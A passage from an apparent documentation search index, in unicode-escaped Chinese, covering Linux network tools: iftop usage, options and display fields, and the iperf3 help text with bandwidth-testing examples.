\u622a\u56fe\u4e2d\uff0c\u6d41\u91cf\u7684\u5355\u4f4d\u901a\u5e38\u662f\u6309\u5b57\u8282\u8ba1\u7b97\u7684\uff0c\u5e76\u4e14\u6839\u636e\u6570\u91cf\u7ea7\u4f7f\u7528\u9002\u5f53\u7684\u524d\u7f00\u3002\u5e38\u89c1\u7684\u5355\u4f4d\u5305\u62ec\uff1a b \uff1a\u4ee3\u8868\u5b57\u8282\uff08Bytes\uff09 Kb \uff1a\u4ee3\u8868\u5343\u5b57\u8282\uff08Kilobytes\uff09 Mb \uff1a\u4ee3\u8868\u5146\u5b57\u8282\uff08Megabytes\uff09 Gb \uff1a\u4ee3\u8868\u5409\u5b57\u8282\uff08Gigabytes\uff09 \u622a\u56fe\u4e0a\u663e\u793a\u7684\u5355\u4f4d\u662f Kb \uff0c\u8868\u793a\u5343\u5b57\u8282\u3002\u8fd9\u610f\u5473\u7740\u6570\u503c\u540e\u9762\u5e26\u6709 Kb \u7684\u6d41\u91cf\u6570\u636e\u662f\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\u7684\u3002\u4f8b\u5982\uff0c 5.41Kb \u8868\u793a 5.41 \u5343\u5b57\u8282\u3002\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u662f\u6309\u7167\u6bcf\u79d2\u7684\u901f\u7387\u663e\u793a\u7684\uff0c\u5373 Kbps \uff08\u5343\u5b57\u8282\u6bcf\u79d2\uff09\u3002\u5728\u7f51\u7edc\u672f\u8bed\u4e2d\uff0c\u901f\u7387\u901a\u5e38\u6307\u7684\u662f\u6bcf\u79d2\u53ef\u4ee5\u4f20\u8f93\u7684\u6570\u636e\u91cf\u3002 https://wangchujiang.com/linux-command/c/iftop.html","title":"\u67e5\u770b\u7f51\u5361\u5b9e\u65f6\u6d41\u91cf"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/iftop/#iftop","text":"","title":"iftop\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/iftop/#_1","text":"iftop \u662f\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u7528\u4e8e\u76d1\u63a7\u7f51\u7edc\u63a5\u53e3\u7684\u5b9e\u65f6\u6d41\u91cf\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b iftop \u7684\u5e38\u7528\u7528\u6cd5\u548c\u547d\u4ee4\u9009\u9879\uff1a \u57fa\u672c\u7528\u6cd5 \uff1a \u76f4\u63a5\u8fd0\u884c iftop \u6765\u89c2\u5bdf\u6240\u6709\u7f51\u7edc\u63a5\u53e3\u7684\u6d41\u91cf\uff1a sudo iftop \u6307\u5b9a\u7f51\u7edc\u63a5\u53e3 \uff1a \u901a\u8fc7 -i \u9009\u9879\u6307\u5b9a\u8981\u76d1\u63a7\u7684\u7279\u5b9a\u7f51\u7edc\u63a5\u53e3\uff1a sudo iftop -i eth0 \u663e\u793a\u6570\u5b57IP\u5730\u5740\u800c\u975e\u4e3b\u673a\u540d \uff1a \u4f7f\u7528 -n \u9009\u9879\u6765\u963b\u6b62 iftop \u5c06 IP \u5730\u5740\u89e3\u6790\u4e3a\u4e3b\u673a\u540d\uff1a sudo iftop -n \u663e\u793a\u7aef\u53e3\u53f7 \uff1a \u4f7f\u7528 -P \u9009\u9879\u663e\u793a\u6e90\u548c\u76ee\u7684\u7aef\u53e3\u53f7\uff1a sudo iftop -P \u8bbe\u7f6e\u6d41\u91cf\u8fc7\u6ee4\u89c4\u5219 \uff1a \u4f7f\u7528 -f \u9009\u9879\u6765\u5e94\u7528\u8fc7\u6ee4\u89c4\u5219\uff0c\u53ea\u663e\u793a\u7b26\u5408\u7279\u5b9a\u6761\u4ef6\u7684\u6d41\u91cf\u3002\u4f8b\u5982\uff0c\u53ea\u663e\u793a\u76ee\u7684\u7aef\u53e3\u4e3a 80 \u7684\u6d41\u91cf\uff1a sudo iftop -f \"dst port 80\" \u9650\u5236\u663e\u793a\u7684\u884c\u6570 \uff1a \u4f7f\u7528 -L \u9009\u9879\u6765\u9650\u5236\u663e\u793a\u7684\u884c\u6570\u3002\u4f8b\u5982\uff0c\u53ea\u663e\u793a\u524d 10 \u884c\u6570\u636e\uff1a sudo iftop -L 10 \u4f7f\u7528\u975e\u7279\u6743\u7528\u6237\u8fd0\u884c \uff1a \u5982\u679c\u4f60\u5df2\u7ecf\u5bf9 iftop \u8bbe\u7f6e\u4e86\u9002\u5f53\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u65e0\u9700 sudo \u8fd0\u884c\uff1a iftop \u663e\u793a\u4e24\u4e2a\u6307\u5b9a\u4e3b\u673a\u95f4\u7684\u6d41\u91cf \uff1a \u4f7f\u7528 -F \u9009\u9879\u6765\u8fc7\u6ee4\u5e76\u663e\u793a\u4e24\u4e2a\u7279\u5b9a\u7f51\u7edc\u5730\u5740\u4e4b\u95f4\u7684\u6d41\u91cf\u3002\u4f8b\u5982\uff1a sudo iftop -F 192.168.1.1/24 \u5e2e\u52a9\u4fe1\u606f \uff1a \u663e\u793a iftop \u7684\u5e2e\u52a9\u4fe1\u606f\uff0c\u4e86\u89e3\u66f4\u591a\u9009\u9879\u548c\u7528\u6cd5\uff1a iftop -h","title":"\u5e38\u89c1\u7528\u6cd5"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/iftop/#_2","text":"\u8fd9\u5f20 iftop \u7684\u622a\u56fe\u663e\u793a\u4e86\u901a\u8fc7 eth0 \u7f51\u7edc\u63a5\u53e3\u7684\u5b9e\u65f6\u7f51\u7edc\u6d41\u91cf\uff0c\u5e76\u4e14\u4f7f\u7528 -P \u53c2\u6570\u6765\u5c55\u793a\u7aef\u53e3\u4fe1\u606f\u3002\u4e0b\u9762\u662f\u5bf9\u5c4f\u5e55\u7684\u89e3\u91ca\uff1a \u6bcf\u4e00\u884c \uff1a\u4ee3\u8868\u4e00\u4e2a\u6d3b\u52a8\u7684\u7f51\u7edc\u8fde\u63a5\u3002\u6bcf\u4e2a\u8fde\u63a5\u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff1a\u6e90\u5730\u5740\uff08\u5de6\u4fa7\uff09\u3001\u76ee\u7684\u5730\u5740\uff08\u4e2d\u95f4\uff09\u548c\u6d41\u91cf\u7edf\u8ba1\uff08\u53f3\u4fa7\uff09\u3002 \u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740 \uff1a\u5de6\u4fa7\u548c\u4e2d\u95f4\u7684\u5217\u663e\u793a\u4e86\u6bcf\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\u4e24\u7aef\u3002\u5730\u5740\u540e\u9762\u53ef\u80fd\u8ddf\u6709\u7aef\u53e3\u53f7\uff0c\u5982 ssh \u6216 http \u7b49\uff0c\u8868\u793a\u5bf9\u5e94\u7684\u670d\u52a1\u3002 \u6d41\u91cf\u7edf\u8ba1 \uff1a\u53f3\u4fa7\u7684\u4e09\u7ec4\u6570\u5b57\u5206\u522b\u4ee3\u8868\u8fc7\u53bb 2 \u79d2\u300110 \u79d2\u548c 40 \u79d2\u5185\u7684\u5e73\u5747\u6d41\u91cf\u901f\u7387\u3002\u8fd9\u4e9b\u6570\u503c\u901a\u5e38\u6709\u4e09\u79cd\uff1a <= \u8868\u793a\u6d41\u5165\u7684\u6d41\u91cf\uff0c => \u8868\u793a\u6d41\u51fa\u7684\u6d41\u91cf\uff0c <=> \u8868\u793a\u53cc\u5411\u7684\u6d41\u91cf\u3002 TX \u548c RX \uff1a\u5e95\u90e8\u7684 TX \u8868\u793a\u4f20\u8f93\uff08\u53d1\u9001\uff09\u7684\u6570\u636e\u603b\u91cf\uff0c RX \u8868\u793a\u63a5\u6536\u7684\u6570\u636e\u603b\u91cf\u3002 cum\u3001peak \u548c rates \uff1a cum \uff1a\u8868\u793a\u81ea iftop \u542f\u52a8\u4ee5\u6765\u7684\u7d2f\u79ef\u6d41\u91cf\u3002 peak \uff1a\u663e\u793a\u89c2\u5bdf\u671f\u95f4\u7684\u6700\u9ad8\u6d41\u91cf\u5cf0\u503c\u3002 rates \uff1a\u5c55\u793a\u5f53\u524d\u7684\u5e73\u5747\u6d41\u91cf\u901f\u7387\uff0c\u5206\u522b\u5bf9\u5e94\u8fc7\u53bb 2 \u79d2\u300110 \u79d2\u548c 40 \u79d2\u7684\u5e73\u5747\u503c\u3002 TOTAL \uff1a\u5e95\u90e8\u7684 TOTAL \u884c\u663e\u793a\u4e86\u4f20\u8f93\u548c\u63a5\u6536\u6570\u636e\u7684\u603b\u548c\u3002 \u7bad\u5934 \uff1a\u6d41\u91cf\u7684\u65b9\u5411\u7531\u7bad\u5934\u6307\u793a\uff0c <= \u8868\u793a\u63a5\u6536\uff0c => \u8868\u793a\u53d1\u9001\u3002 \u5728\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u4f60\u76d1\u63a7\u7f51\u7edc\u6d41\u91cf\u7684\u5927\u5c0f\u3001\u6d41\u5411\u4ee5\u53ca\u968f\u65f6\u95f4\u7684\u53d8\u5316\u60c5\u51b5\uff0c\u4ece\u800c\u5bf9\u7f51\u7edc\u4f7f\u7528\u60c5\u51b5\u6709\u4e00\u4e2a\u76f4\u89c2\u7684\u7406\u89e3\u3002 \u5728 iftop \u622a\u56fe\u4e2d\uff0c\u6d41\u91cf\u7684\u5355\u4f4d\u901a\u5e38\u662f\u6309\u5b57\u8282\u8ba1\u7b97\u7684\uff0c\u5e76\u4e14\u6839\u636e\u6570\u91cf\u7ea7\u4f7f\u7528\u9002\u5f53\u7684\u524d\u7f00\u3002\u5e38\u89c1\u7684\u5355\u4f4d\u5305\u62ec\uff1a b \uff1a\u4ee3\u8868\u5b57\u8282\uff08Bytes\uff09 Kb \uff1a\u4ee3\u8868\u5343\u5b57\u8282\uff08Kilobytes\uff09 Mb \uff1a\u4ee3\u8868\u5146\u5b57\u8282\uff08Megabytes\uff09 Gb \uff1a\u4ee3\u8868\u5409\u5b57\u8282\uff08Gigabytes\uff09 \u622a\u56fe\u4e0a\u663e\u793a\u7684\u5355\u4f4d\u662f Kb \uff0c\u8868\u793a\u5343\u5b57\u8282\u3002\u8fd9\u610f\u5473\u7740\u6570\u503c\u540e\u9762\u5e26\u6709 Kb \u7684\u6d41\u91cf\u6570\u636e\u662f\u4ee5\u5343\u5b57\u8282\u4e3a\u5355\u4f4d\u7684\u3002\u4f8b\u5982\uff0c 5.41Kb \u8868\u793a 5.41 \u5343\u5b57\u8282\u3002\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u662f\u6309\u7167\u6bcf\u79d2\u7684\u901f\u7387\u663e\u793a\u7684\uff0c\u5373 Kbps \uff08\u5343\u5b57\u8282\u6bcf\u79d2\uff09\u3002\u5728\u7f51\u7edc\u672f\u8bed\u4e2d\uff0c\u901f\u7387\u901a\u5e38\u6307\u7684\u662f\u6bcf\u79d2\u53ef\u4ee5\u4f20\u8f93\u7684\u6570\u636e\u91cf\u3002 https://wangchujiang.com/linux-command/c/iftop.html","title":"\u547d\u4ee4\u7ed3\u679c\u89e3\u91ca"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/iperf3/","text":"iperf3\u547d\u4ee4 [root@VM-0-16-centos ~]\uff03 iperf3 --help \u7528\u6cd5\uff1aiperf [-s | -c \u4e3b\u673a] [\u9009\u9879] iperf [-h | --help] [-v | --version] \u670d\u52a1\u5668\u6216\u5ba2\u6237\u7aef\uff1a -p\uff0c--port \uff03 \u670d\u52a1\u5668\u76d1\u542c/\u8fde\u63a5\u7684\u7aef\u53e3 -f\uff0c--format [kmgKMG] \u62a5\u544a\u683c\u5f0f\uff1aK\u4f4d\uff0cM\u4f4d\uff0cK\u5b57\u8282\uff0cM\u5b57\u8282 -i\uff0c--interval \uff03 \u5468\u671f\u6027\u5e26\u5bbd\u62a5\u544a\u4e4b\u95f4\u7684\u79d2\u6570 -F\uff0c--file name \u4f20\u8f93/\u63a5\u6536\u6307\u5b9a\u6587\u4ef6 -A\uff0c--affinity n/n,m \u8bbe\u7f6eCPU\u4eb2\u548c\u6027 -B\uff0c--bind <host> \u7ed1\u5b9a\u5230\u7279\u5b9a\u63a5\u53e3 -V\uff0c--verbose \u66f4\u8be6\u7ec6\u7684\u8f93\u51fa -J\uff0c--json \u4ee5JSON\u683c\u5f0f\u8f93\u51fa --logfile f \u5c06\u8f93\u51fa\u53d1\u9001\u5230\u65e5\u5fd7\u6587\u4ef6 --forceflush \u5f3a\u5236\u5728\u6bcf\u4e2a\u95f4\u9694\u5185\u5237\u65b0\u8f93\u51fa -d\uff0c--debug \u53d1\u51fa\u8c03\u8bd5\u8f93\u51fa -v\uff0c--version \u663e\u793a\u7248\u672c\u4fe1\u606f\u5e76\u9000\u51fa -h\uff0c--help \u663e\u793a\u6b64\u6d88\u606f\u5e76\u9000\u51fa \u670d\u52a1\u5668\u7279\u5b9a\uff1a -s\uff0c--server \u4ee5\u670d\u52a1\u5668\u6a21\u5f0f\u8fd0\u884c -D\uff0c--daemon \u5c06\u670d\u52a1\u5668\u4f5c\u4e3a\u5b88\u62a4\u7a0b\u5e8f\u8fd0\u884c -I\uff0c--pidfile file \u5199\u5165PID\u6587\u4ef6 -1\uff0c--one-off \u5904\u7406\u4e00\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5\u7136\u540e\u9000\u51fa \u5ba2\u6237\u7aef\u7279\u5b9a\uff1a -c\uff0c--client <host> \u4ee5\u5ba2\u6237\u7aef\u6a21\u5f0f\u8fd0\u884c\uff0c\u8fde\u63a5\u5230<host> -u\uff0c--udp \u4f7f\u7528UDP\u800c\u4e0d\u662fTCP -b\uff0c--bandwidth #[KMG][/#] \u76ee\u6807\u5e26\u5bbd\u4f4d\u6570/\u79d2\uff080\u4e3a\u65e0\u9650\u5236\uff09 \uff08UDP\u9ed8\u8ba41 Mbit/sec\uff0cTCP\u65e0\u9650\u5236\uff09 \uff08\u7528\u4e8e\u7a81\u53d1\u6a21\u5f0f\u7684\u53ef\u9009\u659c\u6760\u548c\u5206\u7ec4\u8ba1\u6570\uff09 --fq-rate #[KMG] \u542f\u7528\u57fa\u4e8e\u516c\u5e73\u6392\u961f\u7684\u5957\u63a5\u5b57\u8c03\u5ea6\u901f\u5ea6 \u4f4d\u6570/\u79d2\uff08\u4ec5\u9002\u7528\u4e8eLinux\uff09 -t\uff0c--time # \u4f20\u8f93\u7684\u65f6\u95f4\uff08\u9ed8\u8ba410\u79d2\uff09 -n\uff0c--bytes #[KMG] \u8981\u4f20\u8f93\u7684\u5b57\u8282\u6570\uff08\u800c\u4e0d\u662f-t\uff09 -k\uff0c--blockcount #[KMG] \u8981\u4f20\u8f93\u7684\u5757\uff08\u6570\u636e\u5305\uff09\u6570\uff08\u800c\u4e0d\u662f-t\u6216-n\uff09 -l\uff0c--len #[KMG] \u8981\u8bfb\u53d6\u6216\u5199\u5165\u7684\u7f13\u51b2\u533a\u957f\u5ea6 \uff08TCP\u9ed8\u8ba4128 KB\uff0cUDP\u52a8\u6001\u62161\uff09 --cport <port> \u7ed1\u5b9a\u5230\u7279\u5b9a\u5ba2\u6237\u7aef\u7aef\u53e3\uff08TCP\u548cUDP\uff0c\u9ed8\u8ba4\uff1a\u4e34\u65f6\u7aef\u53e3\uff09 -P\uff0c--parallel # \u8981\u8fd0\u884c\u7684\u5e76\u884c\u5ba2\u6237\u7aef\u6d41\u6570 -R\uff0c--reverse \u4ee5\u53cd\u5411\u6a21\u5f0f\u8fd0\u884c\uff08\u670d\u52a1\u5668\u53d1\u9001\uff0c\u5ba2\u6237\u7aef\u63a5\u6536\uff09 -w\uff0c--window #[KMG] \u8bbe\u7f6e\u7a97\u53e3\u5927\u5c0f/\u5957\u63a5\u5b57\u7f13\u51b2\u533a\u5927\u5c0f -C\uff0c--congestion <algo> \u8bbe\u7f6eTCP\u62e5\u585e\u63a7\u5236\u7b97\u6cd5\uff08\u4ec5\u9002\u7528\u4e8eLinux\u548cFreeBSD\uff09 -M\uff0c--set-mss # \u8bbe\u7f6eTCP/SCTP\u6700\u5927\u6bb5\u5927\u5c0f\uff08MTU - 40\u5b57\u8282\uff09 -N\uff0c--no-delay \u8bbe\u7f6eTCP/SCTP\u65e0\u5ef6\u8fdf\uff0c\u7981\u7528Nagle\u7b97\u6cd5 -4\uff0c--version4 \u4ec5\u4f7f\u7528IPv4 -6\uff0c--version6 \u4ec5\u4f7f\u7528IPv6 -S\uff0c--tos N \u8bbe\u7f6eIP\u201c\u670d\u52a1\u7c7b\u578b\u201d -L\uff0c--flowlabel N \u8bbe\u7f6eIPv6\u6d41\u6807\u7b7e\uff08\u4ec5\u5728Linux\u4e0a\u652f\u6301\uff09 -Z\uff0c--zerocopy \u4f7f\u7528\u201c\u96f6\u62f7\u8d1d\u201d\u65b9\u6cd5\u53d1\u9001\u6570\u636e -O\uff0c--omit N \u7701\u7565\u524dn\u79d2 -T\uff0c--title str \u6bcf\u4e2a\u8f93\u51fa\u884c\u90fd\u4ee5\u6b64\u5b57\u7b26\u4e32\u4e3a\u524d\u7f00 --get-server-output \u4ece\u670d\u52a1\u5668\u83b7\u53d6\u7ed3\u679c --udp-counters-64bit \u5728UDP\u6d4b\u8bd5\u6570\u636e\u5305\u4e2d\u4f7f\u752864\u4f4d\u8ba1\u6570\u5668 [KMG]\u8868\u793a\u652f\u6301kilo\uff08\u5343\u4f4d\uff09\uff0cmega\uff08\u5146\u4f4d\uff09\u6216giga\uff08\u5409\u4f4d\uff09\u7684\u9009\u9879\u540e\u7f00 iperf3\u4e3b\u9875\uff1ahttp://software.es.net/iperf/ \u62a5\u544a\u9519\u8bef\uff1ahttps://github.com/esnet/iperf \u5f53\u4f7f\u7528iperf3\u8fdb\u884c\u7f51\u7edc\u6027\u80fd\u6d4b\u8bd5\u65f6\uff0c\u4ee5\u4e0b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684\u7528\u6cd5\u793a\u4f8b\uff1a \u5728\u670d\u52a1\u5668\u6a21\u5f0f\u4e0b\u8fd0\u884ciperf3\uff1a iperf3 -s \u8fd9\u5c06\u5728\u9ed8\u8ba4\u7aef\u53e3\uff085201\uff09\u4e0a\u542f\u52a8iperf3\u670d\u52a1\u5668\u4ee5\u76d1\u542c\u8fde\u63a5\u8bf7\u6c42\u3002 \u5728\u5ba2\u6237\u7aef\u6a21\u5f0f\u4e0b\u8fde\u63a5\u5230iperf3\u670d\u52a1\u5668\uff0c\u8fdb\u884c\u4e0b\u8f7d\u6d4b\u8bd5\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -R \u7528\u670d\u52a1\u5668\u7684\u5b9e\u9645IP\u5730\u5740\u66ff\u6362\u201c\u670d\u52a1\u5668IP\u5730\u5740\u201d\u4ee5\u8fde\u63a5\u5230\u670d\u52a1\u5668\u5e76\u6d4b\u8bd5\u5e26\u5bbd\u3002 iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -R -P 10 \u5f0010\u4e2a\u5e76\u53d1\uff0c\u540c\u65f6\u8fdb\u884c\u4e0b\u8f7d\u6d4b\u8bd5 iperf3 -c -w 1024K \u670d\u52a1\u5668IP\u5730\u5740 -R -P 10 \u8bbe\u7f6etcp\u7a97\u53e3\u4e3a1024K\uff0c\u5f0010\u4e2a\u5e76\u53d1\uff0c\u540c\u65f6\u8fdb\u884c\u4e0b\u8f7d\u6d4b\u8bd5 \u4f7f\u7528UDP\u534f\u8bae\u8fdb\u884c\u6d4b\u8bd5\uff1a iperf3 -u -c \u670d\u52a1\u5668IP\u5730\u5740 \u8fd9\u5c06\u4f7f\u7528UDP\u534f\u8bae\u800c\u4e0d\u662f\u9ed8\u8ba4\u7684TCP\u534f\u8bae\u8fdb\u884c\u5e26\u5bbd\u6d4b\u8bd5\u3002 \u8bbe\u7f6e\u6d4b\u8bd5\u65f6\u957f\uff1a iperf3 -t 30 -c \u670d\u52a1\u5668IP\u5730\u5740 \u8fd9\u5c06\u4f7fiperf3\u6d4b\u8bd5\u8fd0\u884c30\u79d2\uff0c\u7136\u540e\u751f\u6210\u5e26\u5bbd\u62a5\u544a\u3002 \u8bbe\u7f6e\u5e26\u5bbd\u9650\u5236\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -b 10M \u8fd9\u5c06\u9650\u5236\u6d4b\u8bd5\u7684\u5e26\u5bbd\u4e3a10\u5146\u4f4d\u6bcf\u79d2\uff08Mbps\uff09\u3002 \u5e76\u884c\u8fde\u63a5\u6d4b\u8bd5\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -P 4 \u8fd9\u5c06\u521b\u5efa4\u4e2a\u5e76\u884c\u8fde\u63a5\u4ee5\u540c\u65f6\u6d4b\u8bd5\u5e26\u5bbd\u3002 \u8f93\u51faJSON\u683c\u5f0f\u62a5\u544a\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -J \u8fd9\u5c06\u751f\u6210\u4e00\u4e2a\u4ee5JSON\u683c\u5f0f\u5448\u73b0\u7684\u5e26\u5bbd\u62a5\u544a\u3002 \u8fd9\u4e9b\u662f\u4e00\u4e9b\u5e38\u89c1\u7684iperf3\u7528\u6cd5\u793a\u4f8b\uff0c\u60a8\u53ef\u4ee5\u6839\u636e\u7279\u5b9a\u7684\u7f51\u7edc\u6d4b\u8bd5\u9700\u6c42\u8fdb\u884c\u8c03\u6574\u548c\u6269\u5c55\u3002 -w \u53c2\u6570\u7528\u4e8e\u8bbe\u7f6eiperf3 \u6d4b\u8bd5\u4e2d\u7684\u7a97\u53e3\u5927\u5c0f\uff08\u6216\u5957\u63a5\u5b57\u7f13\u51b2\u533a\u5927\u5c0f\uff09\u3002\u7a97\u53e3\u5927\u5c0f\u5728TCP\u6d4b\u8bd5\u4e2d\u7279\u522b\u91cd\u8981\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u5f71\u54cd\u6570\u636e\u4f20\u8f93\u901f\u5ea6\u548c\u6027\u80fd\u3002\u4e0b\u9762\u662f -w \u53c2\u6570\u7684\u7528\u6cd5\u793a\u4f8b\uff1a iperf3 -c \u670d\u52a1\u5668IP\u5730\u5740 -w 64K \u5728\u8fd9\u4e2a\u793a\u4f8b\u4e2d\uff0c -w \u540e\u9762\u8ddf\u7740\u7a97\u53e3\u5927\u5c0f\u7684\u8bbe\u7f6e\uff0c\u8fd9\u91cc\u8bbe\u7f6e\u7a97\u53e3\u5927\u5c0f\u4e3a 64K\uff0864\u5343\u5b57\u8282\uff09\u3002\u60a8\u53ef\u4ee5\u6839\u636e\u9700\u6c42\u8c03\u6574\u7a97\u53e3\u5927\u5c0f\u7684\u503c\uff0c\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528 K\u3001M \u6216 G \u4f5c\u4e3a\u540e\u7f00\uff0c\u8868\u793a\u5343\u5b57\u8282\u3001\u5146\u5b57\u8282\u6216\u5343\u5146\u5b57\u8282\u3002 \u7a97\u53e3\u5927\u5c0f\u7684\u9009\u62e9\u53d6\u51b3\u4e8e\u7f51\u7edc\u73af\u5883\u548c\u6d4b\u8bd5\u76ee\u6807\u3002\u8f83\u5927\u7684\u7a97\u53e3\u5927\u5c0f\u53ef\u80fd\u4f1a\u63d0\u9ad8\u5e26\u5bbd\u5229\u7528\u7387\uff0c\u4f46\u53ef\u80fd\u4f1a\u589e\u52a0\u5ef6\u8fdf\u3002\u8f83\u5c0f\u7684\u7a97\u53e3\u5927\u5c0f\u53ef\u80fd\u4f1a\u51cf\u5c11\u5ef6\u8fdf\uff0c\u4f46\u53ef\u80fd\u65e0\u6cd5\u5145\u5206\u5229\u7528\u9ad8\u5e26\u5bbd\u8fde\u63a5\u3002\u56e0\u6b64\uff0c\u60a8\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u6d4b\u8bd5\u548c\u8c03\u6574\uff0c\u4ee5\u627e\u5230\u6700\u4f73\u7684\u7a97\u53e3\u5927\u5c0f\u8bbe\u7f6e\u3002","title":"iperf3\u6d4b\u901f"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/iperf3/#iperf3","text":"[root@VM-0-16-centos ~]\uff03 iperf3 --help \u7528\u6cd5\uff1aiperf [-s | -c \u4e3b\u673a] [\u9009\u9879] iperf [-h | --help] [-v | --version] \u670d\u52a1\u5668\u6216\u5ba2\u6237\u7aef\uff1a -p\uff0c--port \uff03 \u670d\u52a1\u5668\u76d1\u542c/\u8fde\u63a5\u7684\u7aef\u53e3 -f\uff0c--format [kmgKMG] \u62a5\u544a\u683c\u5f0f\uff1aK\u4f4d\uff0cM\u4f4d\uff0cK\u5b57\u8282\uff0cM\u5b57\u8282 -i\uff0c--interval \uff03 \u5468\u671f\u6027\u5e26\u5bbd\u62a5\u544a\u4e4b\u95f4\u7684\u79d2\u6570 -F\uff0c--file name \u4f20\u8f93/\u63a5\u6536\u6307\u5b9a\u6587\u4ef6 -A\uff0c--affinity n/n,m \u8bbe\u7f6eCPU\u4eb2\u548c\u6027 -B\uff0c--bind <host> \u7ed1\u5b9a\u5230\u7279\u5b9a\u63a5\u53e3 -V\uff0c--verbose \u66f4\u8be6\u7ec6\u7684\u8f93\u51fa -J\uff0c--json \u4ee5JSON\u683c\u5f0f\u8f93\u51fa --logfile f \u5c06\u8f93\u51fa\u53d1\u9001\u5230\u65e5\u5fd7\u6587\u4ef6 --forceflush \u5f3a\u5236\u5728\u6bcf\u4e2a\u95f4\u9694\u5185\u5237\u65b0\u8f93\u51fa -d\uff0c--debug \u53d1\u51fa\u8c03\u8bd5\u8f93\u51fa -v\uff0c--version \u663e\u793a\u7248\u672c\u4fe1\u606f\u5e76\u9000\u51fa -h\uff0c--help \u663e\u793a\u6b64\u6d88\u606f\u5e76\u9000\u51fa \u670d\u52a1\u5668\u7279\u5b9a\uff1a -s\uff0c--server \u4ee5\u670d\u52a1\u5668\u6a21\u5f0f\u8fd0\u884c -D\uff0c--daemon \u5c06\u670d\u52a1\u5668\u4f5c\u4e3a\u5b88\u62a4\u7a0b\u5e8f\u8fd0\u884c -I\uff0c--pidfile file \u5199\u5165PID\u6587\u4ef6 -1\uff0c--one-off \u5904\u7406\u4e00\u4e2a\u5ba2\u6237\u7aef\u8fde\u63a5\u7136\u540e\u9000\u51fa \u5ba2\u6237\u7aef\u7279\u5b9a\uff1a -c\uff0c--client <host> \u4ee5\u5ba2\u6237\u7aef\u6a21\u5f0f\u8fd0\u884c\uff0c\u8fde\u63a5\u5230<host> -u\uff0c--udp \u4f7f\u7528UDP\u800c\u4e0d\u662fTCP -b\uff0c--bandwidth #[KMG][/#] \u76ee\u6807\u5e26\u5bbd\u4f4d\u6570/\u79d2\uff080\u4e3a\u65e0\u9650\u5236\uff09 \uff08UDP\u9ed8\u8ba41 Mbit/sec\uff0cTCP\u65e0\u9650\u5236\uff09 \uff08\u7528\u4e8e\u7a81\u53d1\u6a21\u5f0f\u7684\u53ef\u9009\u659c\u6760\u548c\u5206\u7ec4\u8ba1\u6570\uff09 --fq-rate #[KMG] \u542f\u7528\u57fa\u4e8e\u516c\u5e73\u6392\u961f\u7684\u5957\u63a5\u5b57\u8c03\u5ea6\u901f\u5ea6 \u4f4d\u6570/\u79d2\uff08\u4ec5\u9002\u7528\u4e8eLinux\uff09 -t\uff0c--time # \u4f20\u8f93\u7684\u65f6\u95f4\uff08\u9ed8\u8ba410\u79d2\uff09 -n\uff0c--bytes #[KMG] \u8981\u4f20\u8f93\u7684\u5b57\u8282\u6570\uff08\u800c\u4e0d\u662f-t\uff09 -k\uff0c--blockcount #[KMG] \u8981\u4f20\u8f93\u7684\u5757\uff08\u6570\u636e\u5305\uff09\u6570\uff08\u800c\u4e0d\u662f-t\u6216-n\uff09 -l\uff0c--len #[KMG] \u8981\u8bfb\u53d6\u6216\u5199\u5165\u7684\u7f13\u51b2\u533a\u957f\u5ea6 \uff08TCP\u9ed8\u8ba4128 KB\uff0cUDP\u52a8\u6001\u62161\uff09 --cport <port> \u7ed1\u5b9a\u5230\u7279\u5b9a\u5ba2\u6237\u7aef\u7aef\u53e3\uff08TCP\u548cUDP\uff0c\u9ed8\u8ba4\uff1a\u4e34\u65f6\u7aef\u53e3\uff09 -P\uff0c--parallel # \u8981\u8fd0\u884c\u7684\u5e76\u884c\u5ba2\u6237\u7aef\u6d41\u6570 -R\uff0c--reverse \u4ee5\u53cd\u5411\u6a21\u5f0f\u8fd0\u884c\uff08\u670d\u52a1\u5668\u53d1\u9001\uff0c\u5ba2\u6237\u7aef\u63a5\u6536\uff09 -w\uff0c--window #[KMG] \u8bbe\u7f6e\u7a97\u53e3\u5927\u5c0f/\u5957\u63a5\u5b57\u7f13\u51b2\u533a\u5927\u5c0f -C\uff0c--congestion <algo> \u8bbe\u7f6eTCP\u62e5\u585e\u63a7\u5236\u7b97\u6cd5\uff08\u4ec5\u9002\u7528\u4e8eLinux\u548cFreeBSD\uff09 -M\uff0c--set-mss # \u8bbe\u7f6eTCP/SCTP\u6700\u5927\u6bb5\u5927\u5c0f\uff08MTU - 40\u5b57\u8282\uff09 -N\uff0c--no-delay \u8bbe\u7f6eTCP/SCTP\u65e0\u5ef6\u8fdf\uff0c\u7981\u7528Nagle\u7b97\u6cd5 -4\uff0c--version4 \u4ec5\u4f7f\u7528IPv4 -6\uff0c--version6 \u4ec5\u4f7f\u7528IPv6 -S\uff0c--tos N \u8bbe\u7f6eIP\u201c\u670d\u52a1\u7c7b\u578b\u201d -L\uff0c--flowlabel N \u8bbe\u7f6eIPv6\u6d41\u6807\u7b7e\uff08\u4ec5\u5728Linux\u4e0a\u652f\u6301\uff09 -Z\uff0c--zerocopy 